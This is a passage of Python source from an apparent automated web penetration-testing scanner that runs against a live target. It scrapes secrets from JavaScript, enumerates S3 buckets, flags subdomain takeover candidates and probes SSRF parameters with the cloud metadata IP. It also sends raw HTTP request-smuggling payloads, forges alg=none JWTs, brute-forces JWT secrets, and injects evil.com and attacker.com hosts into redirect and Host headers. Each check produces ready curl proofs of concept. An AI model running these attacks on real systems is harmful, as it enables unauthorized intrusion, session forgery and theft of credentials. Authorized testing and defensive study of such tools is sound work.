                    parts = m.split('.')
                    payload = json.loads(base64.b64decode(parts[1] + "==").decode('utf-8','replace'))
                    profile.jwt_tokens.append({"raw": m[:40], "payload": payload, "source": jf})
                    warn(f"  JWT found in JS: {payload}")
                except Exception: pass
        profile.api_endpoints.extend(list(eps)[:50])
        profile.parameters = sorted(params)[:100]
        ok(f"  {len(eps)} endpoints, {len(params)} parameters")
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 12: SOURCEMAP ANALYZER  (SKILL-12)
# ══════════════════════════════════════════════════════════════
class SourcemapAnalyzer:
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("SOURCEMAP-12: Webpack sourcemap exposure detection")
        found = []
        for js_url in profile.js_files[:10]:
            map_url = js_url + ".map"
            code, body, _ = _fetch(map_url, cfg.user_agent, cfg.timeout)
            if code == 200 and ('"sources"' in body or '"mappings"' in body):
                high(f"  SOURCEMAP EXPOSED: {map_url}")
                found.append(map_url)
                try:
                    sm = json.loads(body)
                    srcs = sm.get("sources", [])
                    hot = [s for s in srcs if re.search(r'secret|key|token|config|auth|password', s, re.I)]
                    if hot: high(f"  Sensitive sources: {hot[:5]}")
                except Exception: pass
        if found:
            profile.findings.append(Finding(
                id="F-SRC-001", title="Exposed Webpack Sourcemaps",
                severity="MEDIUM", cwe="CWE-540", cvss=5.3,
                description=f"{len(found)} sourcemap(s) publicly accessible — full source code exposed.",
                evidence="\n".join(found),
                reproduction=f"curl -s '{found[0]}' | python3 -c \"import sys,json;d=json.load(sys.stdin);print('\\n'.join(d.get('sources',[])))\"",
                poc_curl=f"curl -sk '{found[0]}'",
                category="Information Disclosure",
                remediation="Disable sourcemap output in production webpack config."
            ))
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 13: SECRET SCANNER  (SKILL-13)
# ══════════════════════════════════════════════════════════════
class SecretScanner:
    PATTERNS = {
        "AWS Access Key":   (r"AKIA[0-9A-Z]{16}", 3.0),
        "Google API Key":   (r"AIza[0-9A-Za-z\-_]{35}", 3.5),
        "GitHub Token":     (r"ghp_[0-9a-zA-Z]{36}|github_pat_[0-9a-zA-Z_]{82}", 3.5),
        "Slack Token":      (r"xox[baprs]-[0-9a-zA-Z\-]{10,}", 3.5),
        "Stripe Secret":    (r"sk_live_[0-9a-zA-Z]{24}", 4.0),
        "SendGrid Key":     (r"SG\.[0-9a-zA-Z\-_.]{22}\.[0-9a-zA-Z\-_.]{43}", 4.0),
        "JWT Token":        (r"eyJ[0-9a-zA-Z_-]+\.[0-9a-zA-Z_-]+\.[0-9a-zA-Z_-]+", 3.0),
        "Bearer Token":     (r"[Bb]earer\s+[0-9a-zA-Z\-_.~+/]+=*", 2.5),
        "Private Key":      (r"-----BEGIN (RSA|EC|PGP|DSA) PRIVATE KEY", 0.0),
        "Zendesk Token":    (r"(?i)zendesk.{0,10}['\"][0-9a-zA-Z_\-]{20,}['\"]", 2.5),
        "Generic API Key":  (r"(?i)(api_key|apikey|access_key|auth_token)\s*[:=]\s*['\"][^'\"]{16,}['\"]", 3.0),
        "Generic Password": (r"(?i)(password|passwd|pwd)\s*[:=]\s*['\"][^'\"]{8,}['\"]", 2.5),
        "Database URL":     (r"(?i)(mysql|postgres|mongodb|redis)://[^'\"\s<>]+", 2.0),
        "S3 Bucket":        (r"s3://[a-zA-Z0-9\-_.]+|s3\.amazonaws\.com/[a-zA-Z0-9\-_.]+", 2.0),
        "Internal IP":      (r"\b(?:192\.168|10\.\d+|172\.(?:1[6-9]|2\d|3[01]))\.\d+\.\d+\b", 1.5),
        "OAuth Client ID":  (r"(?i)client_id\s*[:=]\s*['\"][0-9a-zA-Z\-_\.]{16,}['\"]", 2.5),
        "Firebase URL":     (r"https://[a-z0-9\-]+\.firebaseio\.com", 2.0),
        "IDOR Pattern":     (r"(?i)/(?:ticket|order|invoice|booking|user|account)/(\d{4,})", 1.0),
        "Email Address":    (r"[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}", 1.5),
        "Twilio SID":       (r"AC[0-9a-fA-F]{32}", 3.5),
        "Salesforce Token": (r"(?i)salesforce.{0,20}['\"][0-9a-zA-Z._\-]{30,}['\"]", 2.5),
        "Freshdesk Key":    (r"(?i)freshdesk.{0,10}['\"][0-9a-zA-Z_\-]{20,}['\"]", 2.5),
        "Debug Info":       (r"(?i)(stack trace|exception|debug|traceback|error at line)", 1.0),
        "npm Token":        (r"npm_[a-zA-Z0-9]{36}", 4.0),
        "PyPI Token":       (r"pypi-[a-zA-Z0-9\-_]{100,}", 4.0),
    }

    def _entropy(self, s: str) -> float:
        if not s: return 0.0
        c = Counter(s); n = len(s)
        return -sum((v/n)*math.log2(v/n) for v in c.values())

    def _scan(self, text: str, source: str) -> List[Dict]:
        found = []
        for name, (pat, min_e) in self.PATTERNS.items():
            for m in re.finditer(pat, text):
                val = m.group(0)
                if self._entropy(val) >= min_e or min_e == 0.0:
                    found.append({"type":name,"value":val[:80],"source":source,
                                  "entropy":round(self._entropy(val),2)})
        return found

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("SECRETS-13: Credential scanning + Shannon entropy (25 patterns)")
        all_s = []
        for src_url in [profile.url] + profile.js_files[:10]:
            _, content, _ = _fetch(src_url, cfg.user_agent, cfg.timeout)
            if content:
                secs = self._scan(content, src_url)
                all_s.extend(secs)
                for s in secs: high(f"  SECRET [{s['type']}]: {s['value'][:60]}")
        profile.secrets = all_s
        if all_s:
            crit = [s for s in all_s if s["type"] in
                    ["AWS Access Key","Private Key","GitHub Token","Stripe Secret","npm Token"]]
            profile.findings.append(Finding(
                id="F-SEC-001", title="Exposed Secrets in JavaScript",
                severity="CRITICAL" if crit else "HIGH", cwe="CWE-798",
                cvss=9.8 if crit else 7.5,
                description=f"{len(all_s)} credential patterns detected in JS/HTML.",
                evidence="\n".join(f"{s['type']}: {s['value'][:60]}" for s in all_s[:5]),
                reproduction=f"curl -s '{all_s[0]['source']}' | grep -iE 'key|token|secret|password'",
                poc_curl=f"curl -sk '{all_s[0]['source']}'",
                category="Information Disclosure",
                remediation="Remove all secrets from client-side code. Use server-side env vars."
            ))
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 14: API MAPPER  (SKILL-14)
# ══════════════════════════════════════════════════════════════
class APIMapper:
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("API-14: API endpoint discovery + Swagger/OpenAPI detection")
        base = profile.url.rstrip("/")
        found = []
        for path in WORDLIST_API_PATHS[:60]:
            code, body, _ = _fetch(base + path, cfg.user_agent, cfg.timeout)
            if code in [200,201,400,401,403,405]:
                found.append({"path":path,"code":code})
                col = C.GREEN if code==200 else C.YELLOW
                print(f"  {col}[{code}]{C.NC} {path}")
                if code == 200 and re.search(r'"openapi"|"swagger"|"paths"', body, re.I):
                    high(f"  API SPEC EXPOSED: {path}")
                    profile.findings.append(Finding(
                        id=f"F-API-{len(profile.findings):03d}",
                        title="Exposed API Documentation (Swagger/OpenAPI)",
                        severity="INFO", cwe="CWE-200", cvss=5.3,
                        description="API specification publicly accessible.",
                        evidence=f"URL: {base+path} | HTTP {code}",
                        reproduction=f"curl -s '{base+path}' | python3 -m json.tool",
                        poc_curl=f"curl -sk '{base+path}'",
                        category="Information Disclosure",
                        remediation="Restrict API docs to authenticated/internal users."
                    ))
        profile.api_endpoints.extend([p["path"] for p in found if p["code"]==200])
        ok(f"  {len(found)} API paths responded")
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 15: GRAPHQL PROBER  (SKILL-15)
# ══════════════════════════════════════════════════════════════
class GraphQLProber:
    PATHS = ["/graphql","/graphiql","/api/graphql","/v1/graphql","/gql","/query","/playground"]
    IQ = json.dumps({"query":"{__schema{types{name fields{name type{name kind}}}}}"})

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("GRAPHQL-15: Introspection + schema extraction")
        base = profile.url.rstrip("/")
        for path in self.PATHS:
            url = base + path
            code, body, _ = _fetch(url, cfg.user_agent, cfg.timeout,
                                   method="POST", data=self.IQ.encode(),
                                   headers_extra={"Content-Type":"application/json",
                                                  "Accept":"application/json"})
            if code == 200 and '"__schema"' in body:
                profile.graphql_endpoints.append(url)
                high(f"  GRAPHQL INTROSPECTION: {url}")
                try:
                    d = json.loads(body)
                    types = d["data"]["__schema"]["types"]
                    user_types = [t["name"] for t in types if not t["name"].startswith("__")]
                    ok(f"  Types ({len(user_types)}): {user_types[:10]}")
                except Exception: pass
                profile.findings.append(Finding(
                    id="F-GQL-001", title="GraphQL Introspection Enabled",
                    severity="HIGH", cwe="CWE-200", cvss=7.5,
                    description="GraphQL introspection exposes full API schema.",
                    evidence=f"URL: {url}",
                    reproduction=f"curl -X POST '{url}' -H 'Content-Type: application/json' -d '{{\"query\":\"{{__schema{{types{{name}}}}}}\"}}'",
                    poc_curl=f"curl -sk -X POST '{url}' -H 'Content-Type: application/json' -d '{{\"query\":\"{{__schema{{types{{name}}}}}}\"}}' | python3 -m json.tool",
                    category="GraphQL",
                    remediation="Disable introspection in production. Use query depth/complexity limits."
                ))
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 16: PATH PROBER  (SKILL-16)
# ══════════════════════════════════════════════════════════════
class PathProber:
    CRITICAL_PATHS = {"/.env","/.git/HEAD","/.git/config","/config.json",
                      "/server-status","/.htpasswd","/.htaccess"}

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("PATHS-16: Sensitive file/directory enumeration (50+ paths)")
        base = profile.url.rstrip("/")
        for path in WORDLIST_API_PATHS:
            is_api = any(path.startswith(p) for p in ["/api","/v","/graphql","/rest",
                         "/swagger","/openapi","/redoc","/actuator","/oauth"])
            if not is_api and path not in self.CRITICAL_PATHS:
                continue
            code, body, _ = _fetch(base + path, cfg.user_agent, cfg.timeout)
            if code == 200 and len(body) > 0:
                profile.sensitive_paths.append(path)
                high(f"  EXPOSED [{code}]: {path} ({len(body)}b)")
                if path in self.CRITICAL_PATHS:
                    profile.findings.append(Finding(
                        id=f"F-PATH-{len(profile.findings):03d}",
                        title=f"Critical File Exposed: {path}",
                        severity="CRITICAL" if "env" in path or ".git" in path else "HIGH",
                        cwe="CWE-538", cvss=9.1 if ".env" in path else 7.5,
                        description=f"Sensitive file '{path}' publicly accessible.",
                        evidence=f"URL: {base+path} | Size: {len(body)}b | Preview: {body[:80]}",
                        reproduction=f"curl -s '{base+path}'",
                        poc_curl=f"curl -sk '{base+path}'",
                        category="Information Disclosure",
                        remediation=f"Block access to '{path}' via server config."
                    ))
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 17: S3 BUCKET CHECKER  (SKILL-17)
# ══════════════════════════════════════════════════════════════
class S3BucketChecker:
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("S3-17: S3 bucket enumeration + permission testing")
        apex = profile.apex; host = profile.host
        candidates = [
            apex.replace(".","-"), host.replace(".","-"),
            f"{apex.replace('.', '-')}-static", f"{apex.replace('.', '-')}-assets",
            f"{apex.replace('.', '-')}-uploads", f"{apex.replace('.', '-')}-backup",
            f"{host.split('.')[0]}-static", f"{host.split('.')[0]}-prod",
        ]
        for bucket in candidates:
            url = f"https://{bucket}.s3.amazonaws.com/"
            code, body, _ = _fetch(url, cfg.user_agent, cfg.timeout)
            if code == 200:
                profile.s3_buckets.append(bucket)
                if "<ListBucketResult" in body:
                    high(f"  S3 LISTABLE: {url}")
                    profile.findings.append(Finding(
                        id=f"F-S3-{len(profile.findings):03d}",
                        title="S3 Bucket Publicly Listable",
                        severity="HIGH", cwe="CWE-732", cvss=7.5,
                        description=f"S3 bucket '{bucket}' allows public object listing.",
                        evidence=f"URL: {url}", reproduction=f"curl -s '{url}'",
                        poc_curl=f"curl -sk '{url}'",
                        category="Cloud Misconfiguration",
                        remediation="Enable S3 Block Public Access. Remove public-read ACL."
                    ))
                else: warn(f"  S3 accessible (not listable): {bucket}")
            elif code == 403:
                warn(f"  S3 exists (403 forbidden): {bucket}")
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 18: SUBDOMAIN TAKEOVER  (SKILL-18)
# ══════════════════════════════════════════════════════════════
class SubdomainTakeoverDetector:
    FINGERPRINTS = {
        "GitHub Pages":  ["There isn't a GitHub Pages site here"],
        "Heroku":        ["No such app","herokuapp.com"],
        "Netlify":       ["Not Found - Request ID"],
        "AWS S3":        ["NoSuchBucket","The specified bucket does not exist"],
        "Azure":         ["404 Web Site not found"],
        "Shopify":       ["Sorry, this shop is currently unavailable"],
        "Zendesk":       ["Help Center Closed"],
        "Fastly":        ["Fastly error: unknown domain"],
        "Surge.sh":      ["project not found"],
        "Pantheon":      ["404 error unknown site"],
        "Sendgrid":      ["The provided CNAME does not point"],
    }

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("TAKEOVER-18: Subdomain takeover (11 provider fingerprints)")
        resolver = DNSResolver()
        all_subs = list(set(profile.subdomains + profile.ct_subdomains))[:25]
        takeovers = []
        for sub in all_subs:
            ip = resolver.resolve(sub)
            if ip == "NXDOMAIN": continue
            code, body, _ = _fetch(f"https://{sub}", cfg.user_agent, 8)
            for provider, sigs in self.FINGERPRINTS.items():
                for sig in sigs:
                    if sig.lower() in body.lower():
                        high(f"  TAKEOVER CANDIDATE: {sub} ({provider})")
                        takeovers.append({"subdomain":sub,"provider":provider})
        if takeovers:
            profile.findings.append(Finding(
                id="F-TKO-001", title="Subdomain Takeover Candidates",
                severity="HIGH", cwe="CWE-284", cvss=8.1,
                description=f"{len(takeovers)} subdomains may be takeable.",
                evidence="\n".join(f"{t['subdomain']}: {t['provider']}" for t in takeovers),
                reproduction="\n".join(f"curl -sk https://{t['subdomain']}/" for t in takeovers[:3]),
                poc_curl=f"curl -sk 'https://{takeovers[0]['subdomain']}/'",
                category="Subdomain Takeover",
                remediation="Remove CNAME records pointing to unclaimed external services."
            ))
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 19: SSRF + OPEN REDIRECT  (SKILL-19)
# ══════════════════════════════════════════════════════════════
class SSRFDetector:
    SSRF_PARAMS = ["url","redirect","next","return","returnurl","goto","link","target",
                   "redir","redirect_uri","callback","feed","host","fetch","path","file",
                   "resource","src","dest","destination","from","origin","webhook",
                   "endpoint","proxy","uri","view","site","page","image_url","img_url"]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("SSRF-19: SSRF parameter identification + open redirect testing")
        # Find params in Wayback URLs
        candidates = []
        for url in profile.wayback_urls[:150]:
            params = parse_qs(urlparse(url).query)
            for p in params:
                if p.lower() in self.SSRF_PARAMS:
                    candidates.append({"param":p,"url":url})
                    warn(f"  SSRF-prone param '{p}': {url[:70]}")
        # Test current page params for open redirect
        for param in self.SSRF_PARAMS[:10]:
            test = f"{profile.url}?{param}=https://evil.com"
            code, _, hdrs = _fetch(test, cfg.user_agent, 5)
            loc = hdrs.get("location","")
            if "evil.com" in loc and code in [301,302,303,307,308]:
                high(f"  OPEN REDIRECT: ?{param}=https://evil.com → {loc}")
                profile.open_redirects.append(test)
        profile.ssrf_params = [c["param"] for c in candidates]
        if candidates:
            profile.findings.append(Finding(
                id="F-SSRF-001", title="SSRF-Prone Parameters Identified",
                severity="HIGH", cwe="CWE-918", cvss=8.6,
                description=f"{len(candidates)} URL/redirect params found in historical URLs.",
                evidence="\n".join(f"{c['param']}: {c['url'][:70]}" for c in candidates[:5]),
                reproduction="\n".join(f"curl -s '{c['url'].split('?')[0]}?{c['param']}=http://169.254.169.254/latest/meta-data/'" for c in candidates[:2]),
                poc_curl=f"curl -sk '{candidates[0]['url'].split('?')[0]}?{candidates[0]['param']}=http://169.254.169.254/latest/meta-data/'",
                category="SSRF",
                remediation="Validate URL params against allowlist. Block RFC1918 + metadata IPs."
            ))
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 20: IDOR + XSS SURFACE  (SKILL-20, SKILL-21)
# ══════════════════════════════════════════════════════════════
class IDORMapper:
    IDOR_PATS = [
        r"/(?:user|account|ticket|order|invoice|booking|request|card)/(\d+)",
        r"[?&](?:id|user_id|ticket_id|order_id|account_id)=(\d+)",
        r"/(\d{4,})",
        r"/[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}",
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("IDOR-20: IDOR pattern mapping + XSS surface identification")
        # IDOR from Wayback URLs
        seen = set(); idor_candidates = []
        for url in list(profile.wayback_urls)[:300] + list(profile.api_endpoints):
            for pat in self.IDOR_PATS:
                if re.search(pat, url, re.I):
                    key = re.sub(r'\d+', 'N', url)
                    if key not in seen:
                        seen.add(key); idor_candidates.append(url)
                    break
        if idor_candidates:
            warn(f"  {len(idor_candidates)} IDOR-susceptible URL patterns")
            for c in idor_candidates[:5]: warn(f"    {c[:80]}")
            profile.findings.append(Finding(
                id="F-IDOR-001", title="IDOR Patterns Detected",
                severity="HIGH", cwe="CWE-639", cvss=8.1,
                description=f"{len(idor_candidates)} URL patterns use sequential/guessable IDs.",
                evidence="\n".join(idor_candidates[:5]),
                reproduction="\n".join(f"# Increment ID in: {c[:60]}" for c in idor_candidates[:2]),
                poc_curl="\n".join("curl -sk '" + re.sub(r'(\d+)', lambda m: str(int(m.group(0))+1), c) + "'" for c in idor_candidates[:2] if re.search(r'\d+', c)),
                category="IDOR",
                remediation="Use unpredictable UUIDs. Enforce server-side ownership checks."
            ))
        # XSS surface
        _, html_body, _ = _fetch(profile.url, cfg.user_agent, cfg.timeout)
        forms = re.findall(r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>', html_body, re.I)
        inputs = re.findall(r'<input[^>]*type=["\'](?:text|search|email|url|tel)["\'][^>]*>', html_body, re.I)
        profile.forms = [{"action": a} for a in forms]
        if inputs or forms:
            ok(f"  XSS surface: {len(forms)} forms, {len(inputs)} text inputs")
            profile.findings.append(Finding(
                id="F-XSS-001", title="XSS Injection Surface Identified",
                severity="MEDIUM", cwe="CWE-79", cvss=6.1,
                description=f"Found {len(inputs)} text inputs and {len(forms)} forms.",
                evidence=f"Forms: {forms[:3]}\nPayloads to test: {PAYLOADS_XSS[:3]}",
                reproduction="# Test each input:\n" + "\n".join(PAYLOADS_XSS[:3]),
                poc_curl=f"# Manual test required at {profile.url}",
                category="XSS Surface",
                remediation="Encode all output. Strict CSP. Server-side input validation."
            ))
        return profile


# ══════════════════════════════════════════════════════════════
# TOOL 21: HTTP REQUEST SMUGGLING DETECTOR  (SKILL-31)
# ══════════════════════════════════════════════════════════════
class HTTPSmugglingDetector:
    """Detect CL.TE, TE.CL, TE.TE via timing + differential responses."""

    def _raw_request(self, host: str, port: int, payload: bytes, timeout: int) -> Tuple[int, str]:
        try:
            s = socket.create_connection((host, port), timeout=timeout)
            if port == 443:
                ctx = _ssl_ctx()
                s = ctx.wrap_socket(s, server_hostname=host)
            s.sendall(payload)
            resp = b""
            s.settimeout(timeout)
            try:
                while True:
                    chunk = s.recv(4096)
                    if not chunk: break
                    resp += chunk
                    if len(resp) > 20000: break
            except socket.timeout: pass
            s.close()
            decoded = resp.decode("utf-8", errors="replace")
            code = 0
            m = re.search(r"HTTP/\S+ (\d+)", decoded)
            if m: code = int(m.group(1))
            return code, decoded
        except Exception as e:
            return 0, str(e)

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("SMUGGLING-21: HTTP Request Smuggling (CL.TE / TE.CL / TE.TE)")
        host = profile.host
        port = 443 if profile.scheme == "https" else 80
        path = urlparse(profile.url).path or "/"
        results = []

        # CL.TE test — Content-Length short, Transfer-Encoding chunked
        cl_te = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 6\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Connection: close\r\n\r\n"
            f"0\r\n\r\nX"
        ).encode()

        # TE.CL test — Transfer-Encoding chunked, Content-Length large
        te_cl = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Connection: close\r\n\r\n"
            f"5e\r\n"
            f"POST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 15\r\n\r\n"
            f"SMUGGLED=true\r\n0\r\n\r\n"
        ).encode()

        for label, payload in [("CL.TE", cl_te), ("TE.CL", te_cl)]:
            t0 = time.time()
            code, resp = self._raw_request(host, port, payload, 8)
            elapsed = time.time() - t0
            results.append({"type": label, "code": code, "time": round(elapsed, 2), "hint": ""})
            if elapsed > 5:
                high(f"  SMUGGLING [{label}]: Timeout {elapsed:.1f}s — possible desync!")
                results[-1]["hint"] = "TIMEOUT — possible desync"
            elif code in [400, 500]:
                warn(f"  SMUGGLING [{label}]: HTTP {code} — server error (investigate manually)")
                results[-1]["hint"] = f"HTTP {code}"
            else:
                info(f"  SMUGGLING [{label}]: HTTP {code} in {elapsed:.1f}s")

        profile.smuggling_results = results
        timeout_hits = [r for r in results if "TIMEOUT" in r.get("hint","")]
        if timeout_hits:
            profile.findings.append(Finding(
                id="F-SMG-001", title="HTTP Request Smuggling Indicator",
                severity="HIGH", cwe="CWE-444", cvss=8.1,
                description="Timing-based detection suggests request desync vulnerability.",
                evidence="\n".join(f"{r['type']}: {r['code']} in {r['time']}s — {r['hint']}" for r in results),
                reproduction=(
                    f"# CL.TE test (manual verification required):\n"
                    f"curl -sk -X POST '{profile.url}' \\\n"
                    f"  -H 'Content-Length: 6' \\\n"
                    f"  -H 'Transfer-Encoding: chunked' \\\n"
                    f"  -d $'0\\r\\n\\r\\nX'"
                ),
                poc_curl=f"# See Burp Suite > HTTP Request Smuggler extension for verification",
                category="HTTP Smuggling",
                remediation="Use HTTP/2 end-to-end. Disable chunked encoding at the edge."
            ))
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 22: JWT VULNERABILITY SCANNER  (SKILL-32)
# ══════════════════════════════════════════════════════════════
class JWTScanner:
    """alg=none, RS256→HS256 confusion, weak secret brute-force."""

    def _decode_jwt(self, token: str) -> Tuple[Dict, Dict]:
        try:
            parts = token.split(".")
            header  = json.loads(base64.b64decode(parts[0] + "==").decode("utf-8","replace"))
            payload = json.loads(base64.b64decode(parts[1] + "==").decode("utf-8","replace"))
            return header, payload
        except Exception:
            return {}, {}

    def _forge_none(self, token: str) -> str:
        parts = token.split(".")
        header = json.loads(base64.b64decode(parts[0] + "==").decode("utf-8","replace"))
        header["alg"] = "none"
        new_header = base64.urlsafe_b64encode(json.dumps(header,separators=(',',':')).encode()).rstrip(b"=").decode()
        return f"{new_header}.{parts[1]}."

    def _brute_secret(self, token: str) -> Optional[str]:
        import hmac
        parts = token.split(".")
        msg = f"{parts[0]}.{parts[1]}".encode()
        try:
            sig = base64.urlsafe_b64decode(parts[2] + "==")
        except Exception:
            return None
        for secret in WORDLIST_JWT_SECRETS:
            candidate = hmac.new(secret.encode(), msg, hashlib.sha256).digest()
            if candidate == sig:
                return secret
        return None

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("JWT-22: JWT alg=none, RS256→HS256, weak secret brute-force")
        if not profile.jwt_tokens:
            info("  No JWT tokens found in JS — scanning responses...")
            _, body, hdrs = _fetch(profile.url, cfg.user_agent, cfg.timeout)
            combined = body + str(hdrs)
            for m in re.finditer(r'eyJ[0-9a-zA-Z_-]+\.[0-9a-zA-Z_-]+\.[0-9a-zA-Z_-]+', combined):
                try:
                    h, p = self._decode_jwt(m.group(0))
                    if h: profile.jwt_tokens.append({"raw": m.group(0), "header": h, "payload": p})
                except Exception: pass

        for token_info in profile.jwt_tokens[:5]:
            raw = token_info.get("raw","")
            if not raw or "." not in raw: continue
            h, p = self._decode_jwt(raw)
            ok(f"  JWT found: alg={h.get('alg','?')} sub={p.get('sub','?')} exp={p.get('exp','?')}")
            issues = []
            # Check expired
            exp = p.get("exp", 0)
            if exp and exp < time.time():
                warn(f"  JWT already expired (exp={exp}) — test if server still accepts it")
                issues.append("expired_accepted")
            # Check none alg
            alg = h.get("alg","").upper()
            if alg == "NONE":
                high("  JWT alg=none — signature not verified!")
                issues.append("alg_none")
            elif alg == "RS256":
                warn("  JWT RS256 — test HS256 confusion attack")
                issues.append("rs256_confusion_candidate")
            # Weak secret
            if alg.startswith("HS"):
                secret = self._brute_secret(raw)
                if secret:
                    high(f"  JWT WEAK SECRET: '{secret}'")
                    issues.append(f"weak_secret:{secret}")
            if issues:
                forged = self._forge_none(raw)
                profile.findings.append(Finding(
                    id=f"F-JWT-{len(profile.findings):03d}",
                    title="JWT Vulnerability Detected",
                    severity="CRITICAL" if "weak_secret" in str(issues) or "alg_none" in issues else "HIGH",
                    cwe="CWE-347", cvss=9.1 if "weak_secret" in str(issues) else 8.1,
                    description=f"JWT issues: {issues}",
                    evidence=f"Token: {raw[:60]}...\nHeader: {h}\nPayload: {p}",
                    reproduction=f"# alg=none forged token:\n{forged}\n# Use in Authorization: Bearer <token>",
                    poc_curl=f"curl -sk '{profile.url}' -H 'Authorization: Bearer {forged}'",
                    category="JWT",
                    remediation="Use RS256. Reject alg=none. Use long random secrets. Verify expiry."
                ))
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 23: OAUTH 2.0 ANALYZER  (SKILL-33)
# ══════════════════════════════════════════════════════════════
class OAuthAnalyzer:
    OIDC_PATHS = ["/.well-known/openid-configuration", "/.well-known/oauth-authorization-server",
                  "/oauth/authorize", "/oauth/token", "/api/oauth", "/api/auth/oauth"]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("OAUTH-23: OAuth 2.0 flow analysis (state, PKCE, redirect_uri)")
        base = profile.url.rstrip("/")
        oidc_config = {}
        issues = []

        for path in self.OIDC_PATHS:
            code, body, _ = _fetch(base + path, cfg.user_agent, cfg.timeout)
            if code == 200 and ('"authorization_endpoint"' in body or '"token_endpoint"' in body):
                high(f"  OIDC CONFIG EXPOSED: {path}")
                profile.oauth_endpoints.append(base + path)
                try: oidc_config = json.loads(body)
                except Exception: pass
                ok(f"  Auth endpoint: {oidc_config.get('authorization_endpoint','?')}")
                ok(f"  Token endpoint: {oidc_config.get('token_endpoint','?')}")

                # Check for implicit flow support (token in URL = bad)
                resp_types = oidc_config.get("response_types_supported", [])
                if "token" in resp_types:
                    high("  Implicit flow supported — access_token exposed in URL!")
                    issues.append("implicit_flow")

                # Check PKCE requirement
                pkce = oidc_config.get("code_challenge_methods_supported", [])
                if not pkce:
                    warn("  PKCE not advertised — authorization code interception risk")
                    issues.append("no_pkce")

        # Check for missing state in OAuth flows in HTML/JS
        _, html_body, _ = _fetch(profile.url, cfg.user_agent, cfg.timeout)
        oauth_links = re.findall(r'href=["\'][^"\']*(?:oauth|authorize)[^"\']*["\']', html_body, re.I)
        for link in oauth_links[:5]:
            if "state=" not in link:
                high(f"  OAuth link missing state param (CSRF): {link[:80]}")
                issues.append("missing_state")

        if issues:
            profile.findings.append(Finding(
                id="F-OAUTH-001", title="OAuth 2.0 Misconfiguration",
                severity="HIGH", cwe="CWE-352", cvss=8.1,
                description=f"OAuth issues: {list(set(issues))}",
                evidence=f"OIDC config: {oidc_config.get('issuer','?')}\nIssues: {issues}",
                reproduction=(
                    "# Missing state CSRF test:\n"
                    f"curl -sk '{base}/oauth/authorize?client_id=X&response_type=code&redirect_uri=https://attacker.com'"
                ),
                poc_curl=f"curl -sk '{base}/oauth/authorize?response_type=token&client_id=test&redirect_uri=https://attacker.com'",
                category="OAuth",
                remediation="Require state param. Enforce PKCE. Disable implicit flow. Whitelist redirect_uri."
            ))
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 24: HOST HEADER INJECTION  (SKILL-34)
# ══════════════════════════════════════════════════════════════
class HostHeaderInjector:
    INJECTIONS = [
        ("X-Forwarded-Host",    "evil.com"),
        ("X-Host",              "evil.com"),
        ("X-Forwarded-Server",  "evil.com"),
        ("X-HTTP-Host-Override","evil.com"),
        ("Forwarded",           "host=evil.com"),
        ("Host",                "evil.com"),
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("HOST-24: Host header injection (password reset poisoning + cache)")
        host = profile.host
        vulns = []
        for header, value in self.INJECTIONS:
            code, body, hdrs = _fetch(profile.url, cfg.user_agent, cfg.timeout,
                                      headers_extra={header: value})
            # Look for injection reflected in response
            if "evil.com" in body:
                high(f"  HOST INJECTION REFLECTED: {header}: {value}")
                vulns.append({"header": header, "value": value, "reflected": True})
            # Check password reset path
            reset_url = profile.url.rstrip("/") + "/password/reset"
            r_code, r_body, r_hdrs = _fetch(reset_url, cfg.user_agent, cfg.timeout,
                                            headers_extra={header: value})
            if "evil.com" in r_body or (r_code == 200 and "email" in r_body.lower()):
                high(f"  PASSWORD RESET POISONING candidate via {header}")
                vulns.append({"header": header, "value": value, "vector": "password_reset"})

        if vulns:
            profile.findings.append(Finding(
                id="F-HOST-001", title="Host Header Injection",
                severity="HIGH", cwe="CWE-601", cvss=8.1,
                description=f"Host header injection reflected via {[v['header'] for v in vulns]}.",
                evidence="\n".join(f"{v['header']}: {v['value']}" for v in vulns),
                reproduction=f"curl -sk -H 'X-Forwarded-Host: evil.com' '{profile.url}'",
                poc_curl=f"curl -sk -H 'X-Forwarded-Host: evil.com' '{profile.url}'",
                burp_request=f"GET / HTTP/1.1\nHost: {host}\nX-Forwarded-Host: evil.com\n",
                category="Host Header Injection",
                remediation="Validate Host header against allowlist. Disable override headers."
            ))
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 25: HTTP PARAMETER POLLUTION  (SKILL-35)
